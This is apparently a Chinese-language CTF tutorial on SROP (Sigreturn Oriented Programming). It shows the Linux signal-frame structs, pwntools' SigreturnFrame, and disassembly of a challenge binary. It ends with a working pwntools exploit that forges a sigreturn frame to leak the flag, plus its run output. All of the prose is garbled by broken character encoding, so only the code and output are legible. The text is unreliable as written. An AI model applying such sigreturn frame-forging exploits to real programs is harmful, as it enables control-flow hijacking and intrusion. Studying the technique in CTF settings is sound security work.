#### SROP ԭ��
##### Linuxϵͳ����
�ڿ�ʼ��һ��֮ǰ�������Ƚ�һ�� Linux ��ϵͳ���á�64 λ�� 32 λ��ϵͳ���ñ�ֱ���`/usr/include/asm/unistd_64.h`�� `/usr/include/asm/unistd_32.h`�У����⻹��Ҫ�鿴`/usr/include/bits/syscall.h`
##### signal����

��ͼ��ʾ�������жϻ��쳣����ʱ���ں˻���ĳ�����̷���һ�� signal���ý��̱����𲢽����ںˣ�1����Ȼ���ں�Ϊ�ý��̱�����Ӧ�������ģ�Ȼ����ת��֮ǰע��õ� signal handler �д�����Ӧ�� signal��2������ signal handler ���غ�3�����ں�Ϊ�ý��ָ̻�֮ǰ����������ģ����ջָ����̵�ִ�У�4����
- һ�� signal frame ����ӵ�ջ����� frame �а����˵�ǰ�Ĵ�����ֵ��һЩ signal ��Ϣ��
- һ���µķ��ص�ַ����ӵ�ջ����������ص�ַָ�� sigreturn ϵͳ���á�
- signal handler �����ã�signal handler ����Ϊȡ�����յ�ʲô signal��
- signal handler ִ����֮���������û����ֹ���򷵻ص�ַ����ִ�� sigreturn ϵͳ���á�
- sigreturn ���� signal frame �ָ����мĴ����Իص�֮ǰ��״̬��
- ��󣬳���ִ�м�����

��ͬ�ļܹ����в�ͬ�� signal frame�������� 32 λ�ṹ��sigcontext �ṹ��ᱻ push ��ջ�У�
```
struct sigcontext
{
  unsigned short gs, __gsh;
  unsigned short fs, __fsh;
  unsigned short es, __esh;
  unsigned short ds, __dsh;
  unsigned long edi;
  unsigned long esi;
  unsigned long ebp;
  unsigned long esp;
  unsigned long ebx;
  unsigned long edx;
  unsigned long ecx;
  unsigned long eax;
  unsigned long trapno;
  unsigned long err;
  unsigned long eip;
  unsigned short cs, __csh;
  unsigned long eflags;
  unsigned long esp_at_signal;
  unsigned short ss, __ssh;
  struct _fpstate * fpstate;
  unsigned long oldmask;
  unsigned long cr2;
};
```
������ 64 λ��push ��ջ�е���ʵ�� ucontext_t �ṹ�壺
```
// defined in /usr/include/sys/ucontext.h
/* Userlevel context.  */
typedef struct ucontext_t
  {
    unsigned long int uc_flags;
    struct ucontext_t *uc_link;
    stack_t uc_stack;           // the stack used by this context
    mcontext_t uc_mcontext;     // the saved context
    sigset_t uc_sigmask;
    struct _libc_fpstate __fpregs_mem;
  } ucontext_t;

// defined in /usr/include/bits/types/stack_t.h
/* Structure describing a signal stack.  */
typedef struct
  {
    void *ss_sp;
    size_t ss_size;
    int ss_flags;
  } stack_t;

// difined in /usr/include/bits/sigcontext.h
struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```
��������������

#### SROP
SROP���� Sigreturn Oriented Programming������������ Sigreturn ���Ƶ����㣬�����й�����

����ϵͳ��ִ�� `sigreturn` ϵͳ���õ�ʱ�򣬲���� `signal` ����飬����֪����ǰ����� `frame` �ǲ���֮ǰ������Ǹ� `frame`������ `sigreturn` ����û�ջ�ϻָ��ָ����мĴ�����ֵ�����û�ջ�Ǳ������û����̵ĵ�ַ�ռ��еģ����û����̿ɶ�д�ġ���������߿��Կ�����ջ��Ҳ�Ϳ��������мĴ�����ֵ������һ��ֻ��Ҫһ�� `gadget`��`syscall; ret`;��

���⣬��� gadget ��һЩϵͳ��û�б��ڴ�������������Կ�������ͬ��λ�����ҵ���������ͼ��

ͨ������ eax/rax �Ĵ������������� syscall ָ��ִ�������ϵͳ���ã�Ȼ�����ǿ��Խ� sigreturn �� ������ϵͳ���ô��������γ�һ�������Ӷ��ﵽ�������ִ�е�Ŀ�ġ�������һ��α�� frame �����ӣ�

rax=59 �� execve ��ϵͳ���úţ����� rdi ����Ϊ�ַ�����/bin/sh���ĵ�ַ��rip ָ��ϵͳ���� syscall����󣬽� rt_sigreturn ����Ϊ sigreturn ϵͳ���õĵ�ַ���� sigreturn ���غ󣬾ͻ�����α��� frame �лָ��Ĵ������Ӷ��õ� shell��

������һ�������ӵ����ӣ�

һ��ʼ Linux ��ͨ��`int 0x80`�жϵķ�ʽ����ϵͳ���ã������Ƚ��е�������Ȩ����ļ�飬Ȼ�����ѹջ����ת�Ȳ����������ɻ��˷������Դ���� Linux 2.6 ��ʼ���ͳ������µ�ϵͳ����ָ�� `sysenter/sysexit`��ǰ�����ڴ� Ring3 ���� Ring0���������ڴ� Ring0 ���� Ring3����û����Ȩ�����飬Ҳû��ѹջ�Ĳ���������ִ���ٶȸ���
#### pwnlib.rop.srop
�� pwntools ���Ѿ������� SROP �����ù��ߣ��� pwnlib.rop.srop��ֱ��ʹ���� SigreturnFrame����������һ�����Ĺ��죺
```python
python
>>> from pwn import *
>>> context.arch
'i386'
>>> SigreturnFrame(kernel='i386')
{'es': 0, 'esp_at_signal': 0, 'fs': 0, 'gs': 0, 'edi': 0, 'eax': 0, 'ebp': 0, 'cs': 115, 'edx': 0, 'ebx': 0, 'ds': 0, 'trapno': 0, 'ecx': 0, 'eip': 0, 'err': 0, 'esp': 0, 'ss': 123, 'eflags': 0, 'fpstate': 0, 'esi': 0}
>>> SigreturnFrame(kernel='amd64')
{'es': 0, 'esp_at_signal': 0, 'fs': 0, 'gs': 0, 'edi': 0, 'eax': 0, 'ebp': 0, 'cs': 35, 'edx': 0, 'ebx': 0, 'ds': 0, 'trapno': 0, 'ecx': 0, 'eip': 0, 'err': 0, 'esp': 0, 'ss': 43, 'eflags': 0, 'fpstate': 0, 'esi': 0}
>>> context.arch = 'amd64'
>>> SigreturnFrame(kernel='amd64')
{'r14': 0, 'r15': 0, 'r12': 0, 'rsi': 0, 'r10': 0, 'r11': 0, '&fpstate': 0, 'rip': 0, 'csgsfs': 51, 'uc_stack.ss_flags': 0, 'oldmask': 0, 'sigmask': 0, 'rsp': 0, 'rax': 0, 'r13': 0, 'cr2': 0, 'r9': 0, 'rcx': 0, 'trapno': 0, 'err': 0, 'rbx': 0, 'uc_stack.ss_sp': 0, 'r8': 0, 'rdx': 0, 'rbp': 0, 'uc_flags': 0, '__reserved': 0, '&uc': 0, 'eflags': 0, 'rdi': 0, 'uc_stack.ss_size': 0}

```
�ܹ������֣��ṹ�ͳ�ʼ����ֵ�� ������ͬ��
- i386 on i386��32 λϵͳ������ 32 λ����
- i386 on amd64��64 λϵͳ������ 32 λ����
- amd64 on amd64��64 Ϊϵͳ������ 64 λ����

�鿴�ļ�����
```
file funsignals_player_bin 
funsignals_player_bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
checksec
```python
python
>>> from pwn import *
>>> print ELF('funsignals_player_bin').checksec()
[*] '/root/sploitfun/srop/funsignals_player_bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments

```
disass
```
gdb-peda$ disass _start
Dump of assembler code for function _start:
   0x0000000010000000 <+0>:	xor    eax,eax
   0x0000000010000002 <+2>:	xor    edi,edi
   0x0000000010000004 <+4>:	xor    edx,edx
   0x0000000010000006 <+6>:	mov    dh,0x4
   0x0000000010000008 <+8>:	mov    rsi,rsp
   0x000000001000000b <+11>:	syscall 
   0x000000001000000d <+13>:	xor    edi,edi
   0x000000001000000f <+15>:	push   0xf
   0x0000000010000011 <+17>:	pop    rax
   0x0000000010000012 <+18>:	syscall 
   0x0000000010000014 <+20>:	int3   
End of assembler dump.
gdb-peda$ p &flag
$2 = (<text variable, no debug info> *) 0x10000023 <flag>
gdb-peda$ x/s 0x10000023
0x10000023 <flag>:	"fake_flag_here_as_original_is_at_server"
gdb-peda$ x/s flag
0x10000023 <flag>:	"fake_flag_here_as_original_is_at_server"
```
���� flag ���ڶ������ļ��ֻ�������ڷ������ϵ��Ǹ����棬��������ȫһ���ġ�






exp����
```python
from pwn import *

elf = ELF('./funsignals_player_bin')
io = process('./funsignals_player_bin')
# io = remote('hack.bckdr.in', 9034)

context.clear()
context.arch = "amd64"

# Creating a custom frame
frame = SigreturnFrame()
frame.rax = constants.SYS_write
frame.rdi = constants.STDOUT_FILENO
frame.rsi = elf.symbols['flag']
frame.rdx = 50
frame.rip = elf.symbols['syscall']

io.send(str(frame))
io.interactive()

```
���н��
```python
python exp.py 
[*] '/root/sploitfun/srop/funsignals_player_bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000000)
    RWX:      Has RWX segments
[+] Starting local process './funsignals_player_bin': pid 11751
[*] Switching to interactive mode
[*] Process './funsignals_player_bin' stopped with exit code 0 (pid 11751)
fake_flag_here_as_original_is_at_server\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00[*] Got EOF while reading in interactive
```